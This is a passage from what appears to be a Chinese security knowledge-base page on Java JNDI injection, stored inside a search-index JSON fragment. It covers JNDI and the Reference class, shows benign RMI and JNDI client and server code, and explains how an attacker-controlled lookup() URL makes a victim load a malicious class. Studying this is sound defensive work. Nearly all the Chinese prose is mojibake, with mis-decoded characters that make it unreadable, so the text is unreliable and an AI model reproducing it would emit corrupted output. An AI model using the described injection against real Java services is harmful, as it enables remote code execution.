å¦‚æœæœåŠ¡ç«¯ä¸å®¢æˆ·ç«¯ä¸åœ¨åŒä¸€ä¸»æœºï¼Œéœ€è¦ä¿è¯è°ƒç”¨çš„è¿œç¨‹å¯¹è±¡å®ç°çš„è¿œç¨‹æ¥å£åœ¨å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯éƒ½å­˜åœ¨ å‚è€ƒæ–‡ç«  https://www.jianshu.com/p/5c6f2b6d458a https://blog.csdn.net/qq_28081453/article/details/83279066 https://www.cnblogs.com/fanghao/p/8918953.html https://www.liaoxuefeng.com/wiki/1252599548343744/1323711850348577 Copyright Â© d4m1ts 2022 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2021-12-25 18:51:59 "},"ä¸ªäººçŸ¥è¯†åº“/02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/1.å®¡è®¡åŸºç¡€/05.JNDIæ³¨å…¥.html":{"url":"ä¸ªäººçŸ¥è¯†åº“/02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/1.å®¡è®¡åŸºç¡€/05.JNDIæ³¨å…¥.html","title":"05.JNDIæ³¨å…¥","keywords":"","body":"TreeviewCopyright Â© d4m1ts all right reserved, powered by aleen42 èƒŒæ™¯çŸ¥è¯† JNDI Service Provider ObjectFactory JNDIæ¦‚è¿° JNDIç±» InitialContextç±» æ„é€ æ–¹æ³• å¸¸ç”¨æ–¹æ³• Referenceç±» æ„é€ æ–¹æ³• å¸¸ç”¨æ–¹æ³• JNDIä»£ç å®ç° å®ç°è¿‡ç¨‹ å®ç°ä¸¾ä¾‹ HelloInterface.classï¼ˆå®šä¹‰è¿œç¨‹æ¥å£ï¼‰ HelloImpl.classï¼ˆHelloInterfaceè¿œç¨‹æ¥å£å®ç°ç±»ï¼‰ Server.classï¼ˆæ³¨å†Œè¿œç¨‹å¯¹è±¡å¹¶ç»‘å®šï¼‰ Client.classï¼ˆè¿œç¨‹è°ƒç”¨ï¼‰ JNDIåŠ¨æ€åè®®è½¬æ¢ JNDI Naming Reference JNDIæ³¨å…¥ JNDIæ³¨å…¥åŸç† JNDIæ³¨å…¥çš„åˆ©ç”¨æ¡ä»¶ JNDIæ³¨å…¥æ”»å‡»æµç¨‹ JNDIæ³¨å…¥ä¸¾ä¾‹ åˆ›å»ºæ¶æ„ç±»Evilï¼ˆä¸èƒ½å¸¦packageï¼‰ å¸¸è§RMIæœåŠ¡ç«¯ï¼Œç»‘å®šæ¶æ„çš„Referenceåˆ°rmiæ³¨å†Œè¡¨ å®¢æˆ·ç«¯è¿œç¨‹è°ƒç”¨evilå¯¹åº”ç±» æ­¥éª¤ JNDIæ³¨å…¥Debug ç»•è¿‡é«˜ç‰ˆæœ¬JDKï¼ˆ8u191+ï¼‰é™åˆ¶ å…³äºCodebase å…³äºJNDI Naming Referenceçš„é™åˆ¶ ç»•è¿‡é«˜ç‰ˆæœ¬JDKé™åˆ¶ï¼šåˆ©ç”¨æœ¬åœ°Classä½œä¸ºReference Factory åˆ©ç”¨ä¸¾ä¾‹ pom.xmlï¼ˆåŒæ–¹å‡éœ€è¦ï¼‰ Server Client å‡ ç§å˜ä½“çš„è¡¨è¾¾å¼ Debugåˆ†æ æ€»ç»“ ç»•è¿‡é«˜ç‰ˆæœ¬JDKé™åˆ¶ï¼šåˆ©ç”¨LDAPè¿”å›åºåˆ—åŒ–æ•°æ®ï¼Œè§¦å‘æœ¬åœ°Gadget åˆ©ç”¨ä¸¾ä¾‹ ç”ŸæˆPOC LDAP Server Client Debugåˆ†æ è°ƒç”¨æ ˆ å»ºè®® å‚è€ƒ èƒŒæ™¯çŸ¥è¯† JNDI Service Provider JNDI ä¸ JNDI Service Provider çš„å…³ç³»ç±»ä¼¼äº Windows ä¸­ SSPI ä¸ SSP çš„å…³ç³»ã€‚å‰è€…æ˜¯ç»Ÿä¸€æŠ½è±¡å‡ºæ¥çš„æ¥å£ï¼Œè€Œåè€…æ˜¯å¯¹æ¥å£çš„å…·ä½“å®ç°ã€‚å¦‚é»˜è®¤çš„ JNDI Service Provider æœ‰ RMI/LDAP ç­‰ç­‰ã€‚ ObjectFactory æ¯ä¸€ä¸ª Service Provider å¯èƒ½é…æœ‰å¤šä¸ª Object Factoryã€‚Object Factory ç”¨äºå°† Naming Serviceï¼ˆå¦‚ RMI/LDAPï¼‰ä¸­å­˜å‚¨çš„æ•°æ®è½¬æ¢ä¸º Java ä¸­å¯è¡¨è¾¾çš„æ•°æ®ï¼Œå¦‚ Java ä¸­çš„å¯¹è±¡æˆ– Java ä¸­çš„åŸºæœ¬æ•°æ®ç±»å‹ã€‚ JNDI çš„æ³¨å…¥çš„é—®é¢˜å°±å‡ºåœ¨äº†å¯è¿œç¨‹ä¸‹è½½è‡ªå®šä¹‰çš„ ObjectFactory ç±»ä¸Šã€‚ä½ å¦‚æœæœ‰å…´è¶£çš„è¯å¯ä»¥å®Œæ•´çœ‹ä¸€ä¸‹ Service Provider æ˜¯å¦‚ä½•ä¸å¤šä¸ª ObjectFactory è¿›è¡Œäº¤äº’çš„ã€‚ JNDIæ¦‚è¿° JNDIï¼ˆJava Naming and Directory Interfaceï¼ŒJavaå‘½åå’Œç›®å½•æ¥å£ï¼‰æ˜¯SUNå…¬å¸æä¾›çš„ä¸€ç§æ ‡å‡†çš„Javaå‘½åç³»ç»Ÿæ¥å£ï¼ŒJNDIæä¾›ç»Ÿä¸€çš„å®¢æˆ·ç«¯APIï¼Œé€šè¿‡ä¸åŒçš„è®¿é—®æä¾›è€…æ¥å£JNDIæœåŠ¡ä¾›åº”æ¥å£(SPI)çš„å®ç°ï¼Œç”±ç®¡ç†è€…å°†JNDI APIæ˜ å°„ä¸ºç‰¹å®šçš„å‘½åæœåŠ¡å’Œç›®å½•ç³»ç»Ÿï¼Œä½¿å¾—Javaåº”ç”¨ç¨‹åºå¯ä»¥å’Œè¿™äº›å‘½åæœåŠ¡å’Œç›®å½•æœåŠ¡ä¹‹é—´è¿›è¡Œäº¤äº’ã€‚ç›®å½•æœåŠ¡æ˜¯å‘½åæœåŠ¡çš„ä¸€ç§è‡ªç„¶æ‰©å±•ã€‚ JNDIæ˜¯ä¸€ä¸ªåº”ç”¨ç¨‹åºè®¾è®¡çš„APIï¼Œä¸ºå¼€å‘äººå‘˜æä¾›äº†æŸ¥æ‰¾å’Œè®¿é—®å„ç§å‘½åå’Œç›®å½•æœåŠ¡çš„é€šç”¨ã€ç»Ÿä¸€çš„æ¥å£ï¼Œç±»ä¼¼JDBCéƒ½æ˜¯æ„å»ºåœ¨æŠ½è±¡å±‚ä¸Šã€‚å…è®¸å®¢æˆ·ç«¯é€šè¿‡åç§°å‘ç°å’ŒæŸ¥æ‰¾æ•°æ®ã€å¯¹è±¡ã€‚è¿™äº›å¯¹è±¡å¯ä»¥å­˜å‚¨åœ¨ä¸åŒçš„å‘½åæˆ–ç›®å½•æœåŠ¡ä¸­ï¼Œå°±åƒäººçš„åå­—æˆ–DNSä¸­çš„åŸŸåä¸IPçš„å…³ç³»ã€‚ JNDIç”±JNDI APIã€å‘½åç®¡ç†ã€JNDI SPIï¼ˆservice provider interfaceï¼‰æœåŠ¡æä¾›çš„æ¥å£ç»„æˆã€‚æˆ‘ä»¬çš„åº”ç”¨å¯ä»¥é€šè¿‡JNDIçš„APIå»è®¿é—®ç›¸å…³æœåŠ¡æä¾›çš„æ¥å£ JDNIçš„æœåŠ¡æ˜¯å¯ä»¥æ‹“å±•çš„ï¼Œå¯ä»¥ä»JNDIé¡µé¢ä¸‹è½½å…¶ä»–æœåŠ¡æä¾›å•†ï¼Œä¹Ÿå¯ä»¥ä»è¿œç¨‹è·å¾—å…¶ä»–æœåŠ¡æä¾›å•† JDKåŒ…æ‹¬ä»¥ä¸‹å‘½å/ç›®å½•æœåŠ¡çš„æœåŠ¡ï¼š è½»å‹ç›®å½•è®¿é—®åè®®ï¼ˆldapï¼‰ é€šç”¨å¯¹è±¡è¯·æ±‚ä»£ç†ä½“ç³»ç»“æ„ï¼ˆCORBAï¼‰ï¼Œé€šç”¨å¯¹è±¡æœåŠ¡ï¼ˆCOSï¼‰åç§°æœåŠ¡ Javaè¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼ˆRMIï¼‰æ³¨å†Œè¡¨ åŸŸåæœåŠ¡ï¼ˆDNSï¼‰ Javaå‘½åå’Œç›®å½•æ¥å£ï¼ˆJNDIï¼‰æ˜¯ä¸€ç§Java APIï¼Œç±»ä¼¼ä¸€ä¸ªç´¢å¼•ä¸­å¿ƒï¼Œå®ƒå…è®¸å®¢æˆ·ç«¯é€šè¿‡nameå‘ç°å’ŒæŸ¥æ‰¾æ•°æ®å’Œå¯¹è±¡ã€‚å…¶åº”ç”¨åœºæ™¯æ¯”å¦‚ï¼šåŠ¨æ€åŠ è½½æ•°æ®åº“é…ç½®æ–‡ä»¶ï¼Œä»è€Œä¿æŒæ•°æ®åº“ä»£ç ä¸å˜åŠ¨ç­‰ã€‚ ä»£ç æ ¼å¼å¦‚ä¸‹ï¼š //æŒ‡å®šéœ€è¦æŸ¥æ‰¾nameåç§° String jndiName= \"Test\"; //åˆå§‹åŒ–é»˜è®¤ç¯å¢ƒ Context context = new InitialContext(); //æŸ¥æ‰¾è¯¥nameçš„æ•°æ® DataSource ds = (DataSourse)context.lookup(jndiName); è¿™é‡Œçš„jndiNameå˜é‡çš„å€¼å¯ä»¥æ˜¯ä¸Šé¢çš„å‘½å/ç›®å½•æœåŠ¡åˆ—è¡¨é‡Œé¢çš„å€¼ï¼Œå¦‚æœJNDIåç§°å¯æ§çš„è¯å¯èƒ½ä¼šè¢«æ”»å‡»ã€‚ é‚£ä¸Šé¢æåˆ°çš„å‘½åå’Œç›®å½•æ˜¯ä»€ä¹ˆï¼Ÿ å‘½åæœåŠ¡ï¼šå‘½åæœåŠ¡æ˜¯ä¸€ç§ç®€å•çš„é”®å€¼å¯¹ç»‘å®šï¼Œå¯ä»¥é€šè¿‡é”®åæ£€ç´¢å€¼ï¼ŒRMIå°±æ˜¯å…¸å‹çš„å‘½åæœåŠ¡ ç›®å½•æœåŠ¡ï¼šç›®å½•æœåŠ¡æ˜¯å‘½åæœåŠ¡çš„æ‹“å±•ã€‚å®ƒä¸å‘½åæœåŠ¡çš„åŒºåˆ«åœ¨äºå®ƒå¯ä»¥é€šè¿‡å¯¹è±¡å±æ€§æ¥æ£€ç´¢å¯¹è±¡ ä¸¾ä¸ªä¾‹å­ï¼šæ¯”å¦‚ä½ è¦åœ¨æŸä¸ªå­¦æ ¡é‡Œé‡Œæ‰¾æŸä¸ªäººï¼Œé‚£ä¹ˆä¼šé€šè¿‡ï¼šå¹´çº§->ç­çº§->å§“åè¿™ç§æ–¹å¼æ¥æŸ¥æ‰¾ï¼Œå¹´çº§ã€ç­çº§ã€å§“åè¿™äº›å°±æ˜¯æŸä¸ªäººçš„å±æ€§ï¼Œè¿™ç§å±‚çº§å…³ç³»å°±å¾ˆåƒç›®å½•å…³ç³»ï¼Œæ‰€ä»¥è¿™ç§å­˜å‚¨å¯¹è±¡çš„æ–¹å¼å°±å«ç›®å½•æœåŠ¡ã€‚LDAPæ˜¯å…¸å‹çš„ç›®å½•æœåŠ¡ å…¶å®ï¼Œä»”ç»†ä¸€ç¢ç£¨å°±ä¼šæ„Ÿè§‰å…¶å®å‘½åæœåŠ¡ä¸ç›®å½•æœåŠ¡çš„æœ¬è´¨æ˜¯ä¸€æ ·çš„ï¼Œéƒ½æ˜¯é€šè¿‡é”®æ¥æŸ¥æ‰¾å¯¹è±¡ï¼Œåªä¸è¿‡ç›®å½•æœåŠ¡çš„é”®è¦çµæ´»ä¸”å¤æ‚ä¸€ç‚¹ã€‚ åœ¨ä¸€å¼€å§‹å¾ˆå¤šäººéƒ½ä¼šè¢«jndiã€rmiè¿™äº›è¯æ±‡æçš„æ™•å¤´è½¬å‘ï¼Œè€Œä¸”å¾ˆå¤šæ–‡ç« ä¸­æåˆ°äº†å¯ä»¥ç”¨jndiè°ƒç”¨rmiï¼Œå°±æ›´å®¹æ˜“è®©äººå‘æ˜äº†ã€‚æˆ‘ä»¬åªè¦çŸ¥é“jndiæ˜¯å¯¹å„ç§è®¿é—®ç›®å½•æœåŠ¡çš„é€»è¾‘è¿›è¡Œäº†å†å°è£…ï¼Œä¹Ÿå°±æ˜¯ä»¥å‰æˆ‘ä»¬è®¿é—®rmiä¸ldapè¦å†™çš„ä»£ç å·®åˆ«å¾ˆå¤§ï¼Œä½†æ˜¯æœ‰äº†jndiè¿™ä¸€å±‚ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç”¨jndiçš„æ–¹å¼æ¥è½»æ¾è®¿é—®rmiæˆ–è€…ldapæœåŠ¡ï¼Œè¿™æ ·è®¿é—®ä¸åŒçš„æœåŠ¡çš„ä»£ç å®ç°åŸºæœ¬æ˜¯ä¸€æ ·çš„ã€‚ä¸€å›¾èƒœåƒè¨€ï¼š ä»å›¾ä¸­å¯ä»¥çœ‹åˆ°jndiåœ¨è®¿é—®rmiæ—¶åªæ˜¯ä¼ äº†ä¸€ä¸ªé”®fooè¿‡å»ï¼Œç„¶årmiæœåŠ¡ç«¯è¿”å›äº†ä¸€ä¸ªå¯¹è±¡ï¼Œè®¿é—®ldapè¿™ç§ç›®å½•æœåŠ¡æ—¶ï¼Œä¼ è¿‡å»çš„å­—ç¬¦ä¸²æ¯”è¾ƒå¤æ‚ï¼ŒåŒ…å«äº†å¤šä¸ªé”®å€¼å¯¹ï¼Œè¿™äº›é”®å€¼å¯¹å°±æ˜¯å¯¹è±¡çš„å±æ€§ï¼ŒLDAPå°†æ ¹æ®è¿™äº›å±æ€§æ¥åˆ¤æ–­åˆ°åº•è¿”å›å“ªä¸ªå¯¹è±¡ã€‚ JNDIç±» åœ¨Java JDKé‡Œé¢æä¾›äº†5ä¸ªåŒ…ï¼Œæä¾›ç»™JNDIçš„åŠŸèƒ½å®ç°ï¼Œåˆ†åˆ«æ˜¯ï¼š //ä¸»è¦ç”¨äºå‘½åæ“ä½œï¼Œå®ƒåŒ…å«äº†å‘½åæœåŠ¡çš„ç±»å’Œæ¥å£ï¼Œè¯¥åŒ…å®šä¹‰äº†Contextæ¥å£å’ŒInitialContextç±»ï¼› javax.naming //ä¸»è¦ç”¨äºç›®å½•æ“ä½œï¼Œå®ƒå®šä¹‰äº†DirContextæ¥å£å’ŒInitialDir- Contextç±»ï¼› javax.naming.directory //åœ¨å‘½åç›®å½•æœåŠ¡å™¨ä¸­è¯·æ±‚äº‹ä»¶é€šçŸ¥ï¼› javax.naming.event //æä¾›LDAPæ”¯æŒï¼› javax.naming.ldap //å…è®¸åŠ¨æ€æ’å…¥ä¸åŒå®ç°ï¼Œä¸ºä¸åŒå‘½åç›®å½•æœåŠ¡ä¾›åº”å•†çš„å¼€å‘äººå‘˜æä¾›å¼€å‘å’Œå®ç°çš„é€”å¾„ï¼Œä»¥ä¾¿åº”ç”¨ç¨‹åºé€šè¿‡JNDIå¯ä»¥è®¿é—®ç›¸å…³æœåŠ¡ã€‚ javax.naming.spi InitialContextç±» åœ¨è¿™JDKé‡Œé¢ç»™çš„è§£é‡Šæ˜¯æ„å»ºåˆå§‹ä¸Šä¸‹æ–‡ï¼Œå…¶å®é€šä¿—ç‚¹æ¥è®²å°±æ˜¯è·å–åˆå§‹ç›®å½•ç¯å¢ƒã€‚ æ„é€ æ–¹æ³• //æ„å»ºä¸€ä¸ªåˆå§‹ä¸Šä¸‹æ–‡ã€‚ InitialContext() //æ„é€ ä¸€ä¸ªåˆå§‹ä¸Šä¸‹æ–‡ï¼Œå¹¶é€‰æ‹©ä¸åˆå§‹åŒ–å®ƒã€‚ InitialContext(boolean lazy) //ä½¿ç”¨æä¾›çš„ç¯å¢ƒæ„å»ºåˆå§‹ä¸Šä¸‹æ–‡ã€‚ InitialContext(Hashtable environment) å®ç°ä»£ç  InitialContext initialContext = new InitialContext(); å¸¸ç”¨æ–¹æ³• //å°†åç§°ç»‘å®šåˆ°å¯¹è±¡ã€‚ bind(Name name, Object obj) //æšä¸¾åœ¨å‘½åä¸Šä¸‹æ–‡ä¸­ç»‘å®šçš„åç§°ä»¥åŠç»‘å®šåˆ°å®ƒä»¬çš„å¯¹è±¡çš„ç±»åã€‚ list(String name) //æ£€ç´¢å‘½åå¯¹è±¡ã€‚ lookup(String name) //å°†åç§°ç»‘å®šåˆ°å¯¹è±¡ï¼Œè¦†ç›–ä»»ä½•ç°æœ‰ç»‘å®šã€‚ rebind(String name, Object obj) //å–æ¶ˆç»‘å®šå‘½åå¯¹è±¡ã€‚ unbind(String name) å®ç°ä»£ç  package org.example; import javax.naming.InitialContext; import javax.naming.NamingException; import java.rmi.RemoteException; public class Client { public static void main( String[] args ) throws NamingException, RemoteException { String uri = \"rmi://127.0.0.1:1099/test\"; InitialContext initialContext = new InitialContext(); HelloInterface helloInterface = (HelloInterface) initialContext.lookup(uri); System.out.println(helloInterface.says(\"hello\")); } } Referenceç±» è¯¥ç±»ä¹Ÿæ˜¯åœ¨javax.namingçš„ä¸€ä¸ªç±»ï¼Œè¯¥ç±»è¡¨ç¤ºå¯¹åœ¨å‘½å/ç›®å½•ç³»ç»Ÿå¤–éƒ¨æ‰¾åˆ°çš„å¯¹è±¡çš„å¼•ç”¨ã€‚æä¾›äº†JNDIä¸­ç±»çš„å¼•ç”¨åŠŸèƒ½ã€‚ åœ¨ä¸€äº›å‘½åæœåŠ¡ç³»ç»Ÿä¸­ï¼Œç³»ç»Ÿå¹¶ä¸æ˜¯ç›´æ¥å°†å¯¹è±¡å­˜å‚¨åœ¨ç³»ç»Ÿä¸­ï¼Œè€Œæ˜¯ä¿æŒå¯¹è±¡çš„å¼•ç”¨ã€‚å¼•ç”¨åŒ…å«äº†å¦‚ä½•è®¿é—®å®é™…å¯¹è±¡çš„ä¿¡æ¯ã€‚å…·ä½“å¯ä»¥æŸ¥çœ‹JavaæŠ€æœ¯å›é¡¾ä¹‹JNDIï¼šå‘½åå’Œç›®å½•æœåŠ¡åŸºæœ¬æ¦‚å¿µã€‚ æ„é€ æ–¹æ³• //ä¸ºç±»åä¸ºâ€œclassNameâ€çš„å¯¹è±¡æ„é€ ä¸€ä¸ªæ–°çš„å¼•ç”¨ã€‚ Reference(String className) //ä¸ºç±»åä¸ºâ€œclassNameâ€çš„å¯¹è±¡å’Œåœ°å€æ„é€ ä¸€ä¸ªæ–°å¼•ç”¨ã€‚ Reference(String className, RefAddr addr) //ä¸ºç±»åä¸ºâ€œclassNameâ€çš„å¯¹è±¡ï¼Œå¯¹è±¡å·¥å‚çš„ç±»åå’Œä½ç½®ä»¥åŠå¯¹è±¡çš„åœ°å€æ„é€ ä¸€ä¸ªæ–°å¼•ç”¨ã€‚ Reference(String className, RefAddr addr, String factory, String factoryLocation) //ä¸ºç±»åä¸ºâ€œclassNameâ€çš„å¯¹è±¡ä»¥åŠå¯¹è±¡å·¥å‚çš„ç±»åå’Œä½ç½®æ„é€ ä¸€ä¸ªæ–°å¼•ç”¨ã€‚ Reference(String className, String factory, String factoryLocation) å®ç°ä»£ç  String url = \"http://127.0.0.1:8080\"; Reference reference = new Reference(\"test\", \"test\", url); åœ¨ä½¿ç”¨Referenceæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å°†å¯¹è±¡ä¼ å…¥æ„é€ æ–¹æ³•ä¸­ï¼Œå½“è¢«è°ƒç”¨æ—¶ï¼Œå¯¹è±¡çš„æ–¹æ³•å°±ä¼šè¢«è§¦å‘ï¼Œåˆ›å»ºReferenceå®ä¾‹æ—¶å‡ ä¸ªæ¯”è¾ƒå…³é”®çš„å±æ€§ï¼š å‚æ•°1ï¼šclassName - è¿œç¨‹åŠ è½½æ—¶æ‰€ä½¿ç”¨çš„ç±»å å‚æ•°2ï¼šclassFactory - åŠ è½½çš„classä¸­éœ€è¦å®ä¾‹åŒ–ç±»çš„åç§° å‚æ•°3ï¼šclassFactoryLocation - æä¾›classesæ•°æ®çš„åœ°å€å¯ä»¥æ˜¯file/ftp/httpåè®® Referenceç±»è¡¨ç¤ºå¯¹å­˜åœ¨äºå‘½å/ç›®å½•ç³»ç»Ÿä»¥å¤–çš„å¯¹è±¡çš„å¼•ç”¨ã€‚å¦‚æœè¿œç¨‹è·å– RMI æœåŠ¡ä¸Šçš„å¯¹è±¡ä¸º Reference ç±»æˆ–è€…å…¶å­ç±»ï¼Œåˆ™åœ¨å®¢æˆ·ç«¯è·å–åˆ°è¿œç¨‹å¯¹è±¡å­˜æ ¹å®ä¾‹æ—¶ï¼Œå¯ä»¥ä»å…¶ä»–æœåŠ¡å™¨ä¸ŠåŠ è½½ class æ–‡ä»¶æ¥è¿›è¡Œå®ä¾‹åŒ–ã€‚ Javaä¸ºäº†å°†Objectå¯¹è±¡å­˜å‚¨åœ¨Namingæˆ–DirectoryæœåŠ¡ä¸‹ï¼Œæä¾›äº†Naming ReferenceåŠŸèƒ½ï¼Œå¯¹è±¡å¯ä»¥é€šè¿‡ç»‘å®šReferenceå­˜å‚¨åœ¨Namingæˆ–DirectoryæœåŠ¡ä¸‹ï¼Œæ¯”å¦‚RMIã€LDAPç­‰ã€‚ è¡¥å…… å¸¸ç”¨æ–¹æ³• void add(int posn, RefAddr addr) å°†åœ°å€æ·»åŠ åˆ°ç´¢å¼•posnçš„åœ°å€åˆ—è¡¨ä¸­ã€‚ void add(RefAddr addr) å°†åœ°å€æ·»åŠ åˆ°åœ°å€åˆ—è¡¨çš„æœ«å°¾ã€‚ void clear() ä»æ­¤å¼•ç”¨ä¸­åˆ é™¤æ‰€æœ‰åœ°å€ã€‚ RefAddr get(int posn) æ£€ç´¢ç´¢å¼•posnä¸Šçš„åœ°å€ã€‚ RefAddr get(String addrType) æ£€ç´¢åœ°å€ç±»å‹ä¸ºâ€œaddrTypeâ€çš„ç¬¬ä¸€ä¸ªåœ°å€ã€‚ Enumeration getAll() æ£€ç´¢æœ¬å‚è€ƒæ–‡çŒ®ä¸­åœ°å€çš„åˆ—ä¸¾ã€‚ String getClassName() æ£€ç´¢å¼•ç”¨å¼•ç”¨çš„å¯¹è±¡çš„ç±»åã€‚ String getFactoryClassLocation() æ£€ç´¢æ­¤å¼•ç”¨å¼•ç”¨çš„å¯¹è±¡çš„å·¥å‚ä½ç½®ã€‚ String getFactoryClassName() æ£€ç´¢æ­¤å¼•ç”¨å¼•ç”¨å¯¹è±¡çš„å·¥å‚çš„ç±»åã€‚ Object remove(int posn) ä»åœ°å€åˆ—è¡¨ä¸­åˆ é™¤ç´¢å¼•posnä¸Šçš„åœ°å€ã€‚ int size() æ£€ç´¢æ­¤å¼•ç”¨ä¸­çš„åœ°å€æ•°ã€‚ String toString() ç”Ÿæˆæ­¤å¼•ç”¨çš„å­—ç¬¦ä¸²è¡¨ç¤ºå½¢å¼ã€‚ JNDIä»£ç å®ç° åœ¨JNDIä¸­æä¾›äº†ç»‘å®šå’ŒæŸ¥æ‰¾çš„æ–¹æ³• bind(Name name, Object obj) ï¼šå°†åç§°ç»‘å®šåˆ°å¯¹è±¡ä¸­ lookup(String name)ï¼š é€šè¿‡åå­—æ£€ç´¢æ‰§è¡Œçš„å¯¹è±¡ å®ç°è¿‡ç¨‹ ç±»ä¼¼rmiçš„å®ç°è¿‡ç¨‹ï¼Œåªä¸è¿‡æœ€åç»‘å®šå’Œæ£€ç´¢çš„æ—¶å€™æœ‰ä¸€ç‚¹å·®åˆ«ã€‚ å®šä¹‰è¿œç¨‹æ¥å£ æœåŠ¡ç«¯å®ç°è¿œç¨‹æ¥å£ æœåŠ¡ç«¯æ³¨å†Œè¿œç¨‹å¯¹è±¡ å®¢æˆ·ç«¯è°ƒç”¨æ¥å£ å®ç°ä¸¾ä¾‹ HelloInterface.classï¼ˆå®šä¹‰è¿œç¨‹æ¥å£ï¼‰ package org.example; import java.rmi.Remote; import java.rmi.RemoteException; public interface HelloInterface extends Remote { String says (String name) throws RemoteException; } HelloImpl.classï¼ˆHelloInterfaceè¿œç¨‹æ¥å£å®ç°ç±»ï¼‰ package org.example; import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; public class HelloImpl extends UnicastRemoteObject implements HelloInterface{ protected HelloImpl() throws RemoteException { } @Override public String says(String name) throws RemoteException { return \"test \" + name; } } Server.classï¼ˆæ³¨å†Œè¿œç¨‹å¯¹è±¡å¹¶ç»‘å®šï¼‰ package org.example; import javax.naming.Context; import javax.naming.InitialContext; import javax.naming.NamingException; import java.rmi.AlreadyBoundException; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.util.Properties; public class Server { public static void main(String[] args) throws RemoteException, AlreadyBoundException, NamingException { //é…ç½®JNDIå·¥å‚å’ŒJNDIçš„urlå’Œç«¯å£ã€‚å¦‚æœæ²¡æœ‰é…ç½®è¿™äº›ä¿¡æ¯ï¼Œä¼šå‡ºç°NoInitialContextExceptionå¼‚å¸¸ Properties env = new Properties(); env.put(Context.INITIAL_CONTEXT_FACTORY,\"com.sun.jndi.rmi.registry.RegistryContextFactory\"); env.put(Context.PROVIDER_URL,\"rmi://127.0.0.1:1099\"); //åˆå§‹åŒ–ç¯å¢ƒ InitialContext ctx = new InitialContext(env); // åˆ›å»ºä¸€ä¸ªæ³¨å†Œè¡¨ LocateRegistry.createRegistry(1099); // è¿œç¨‹è°ƒç”¨å¯¹è±¡ HelloInterface hello = new HelloImpl(); // ç»‘å®š ctx.bind(\"test\", hello); } } Client.classï¼ˆè¿œç¨‹è°ƒç”¨ï¼‰ package org.example; import javax.naming.InitialContext; import javax.naming.NamingException; import java.rmi.RemoteException; public class Client { public static void main( String[] args ) throws NamingException, RemoteException { //åˆå§‹åŒ–ç¯å¢ƒ InitialContext init = new InitialContext(); //JNDIçš„æ–¹å¼è·å–è¿œç¨‹å¯¹è±¡ HelloInterface hello = (HelloInterface) init.lookup(\"rmi://127.0.0.1:1099/test\"); // è°ƒç”¨æ–¹æ³• System.out.println(hello.says(\"123\")); } } JNDIåŠ¨æ€åè®®è½¬æ¢ æˆ‘ä»¬ä¸Šé¢çš„demoæå‰é…ç½®äº†jndiçš„åˆå§‹åŒ–ç¯å¢ƒï¼Œè¿˜é…ç½®äº†Context.PROVIDER_URLï¼Œè¿™ä¸ªå±æ€§æŒ‡å®šäº†åˆ°å“ªé‡ŒåŠ è½½æœ¬åœ°æ²¡æœ‰çš„ç±»ï¼Œæ‰€ä»¥ï¼Œä¸Šé¢çš„demoä¸­ init.lookup(\"rmi://127.0.0.1:1099/test\")è¿™ä¸€å¤„ä»£ç æ”¹ä¸ºinit.lookup(\"test\")ä¹Ÿæ˜¯æ²¡å•¥é—®é¢˜çš„ã€‚ é‚£ä¹ˆåŠ¨æ€åè®®è½¬æ¢æ˜¯ä¸ªä»€ä¹ˆæ„æ€å‘¢ï¼Ÿå…¶å®å°±æ˜¯è¯´å³ä½¿æå‰é…ç½®äº†Context.PROVIDER_URLå±æ€§ï¼Œå½“æˆ‘ä»¬è°ƒç”¨lookup()æ–¹æ³•æ—¶ï¼Œå¦‚æœlookupæ–¹æ³•çš„å‚æ•°åƒdemoä¸­é‚£æ ·æ˜¯ä¸€ä¸ªuriåœ°å€ï¼Œé‚£ä¹ˆå®¢æˆ·ç«¯å°±ä¼šå»lookup()æ–¹æ³•å‚æ•°æŒ‡å®šçš„uriä¸­åŠ è½½è¿œç¨‹å¯¹è±¡ï¼Œè€Œä¸æ˜¯å»Context.PROVIDER_URLè®¾ç½®çš„åœ°å€å»åŠ è½½å¯¹è±¡(å¦‚æœæ„Ÿå…´è¶£å¯ä»¥è·Ÿä¸€ä¸‹æºç ï¼Œå¯ä»¥çœ‹åˆ°å…·ä½“çš„å®ç°ï¼‰ã€‚ æ­£æ˜¯å› ä¸ºæœ‰è¿™ä¸ªç‰¹æ€§ï¼Œæ‰å¯¼è‡´å½“lookup()æ–¹æ³•çš„å‚æ•°å¯æ§æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æä¾›ä¸€ä¸ªæ¶æ„çš„urlåœ°å€æ¥æ§åˆ¶å—å®³è€…åŠ è½½æ”»å‡»è€…æŒ‡å®šçš„æ¶æ„ç±»ã€‚ ä½†æ˜¯ä½ ä»¥ä¸ºç›´æ¥è®©å—å®³è€…å»æ”»å‡»è€…æŒ‡å®šçš„rmiæ³¨å†Œè¡¨åŠ è½½ä¸€ä¸ªç±»å›æ¥å°±èƒ½å®Œæˆæ”»å‡»å—ï¼Œæ˜¯ä¸è¡Œçš„ï¼Œå› ä¸ºå—å®³è€…æœ¬åœ°æ²¡æœ‰æ”»å‡»è€…æä¾›çš„ç±»çš„classæ–‡ä»¶ï¼Œæ‰€ä»¥æ˜¯è°ƒç”¨ä¸äº†æ–¹æ³•çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å€ŸåŠ©æ¥ä¸‹æ¥è¦æåˆ°çš„ä¸œè¥¿ã€‚ JNDI Naming Reference Referenceç±»è¡¨ç¤ºå¯¹å­˜åœ¨äºå‘½å/ç›®å½•ç³»ç»Ÿä»¥å¤–çš„å¯¹è±¡çš„å¼•ç”¨ã€‚å¦‚æœè¿œç¨‹è·å– RMI æœåŠ¡ä¸Šçš„å¯¹è±¡ä¸º Reference ç±»æˆ–è€…å…¶å­ç±»ï¼Œåˆ™åœ¨å®¢æˆ·ç«¯è·å–åˆ°è¿œç¨‹å¯¹è±¡å­˜æ ¹å®ä¾‹æ—¶ï¼Œå¯ä»¥ä»å…¶ä»–æœåŠ¡å™¨ä¸ŠåŠ è½½ class æ–‡ä»¶æ¥è¿›è¡Œå®ä¾‹åŒ–ã€‚ 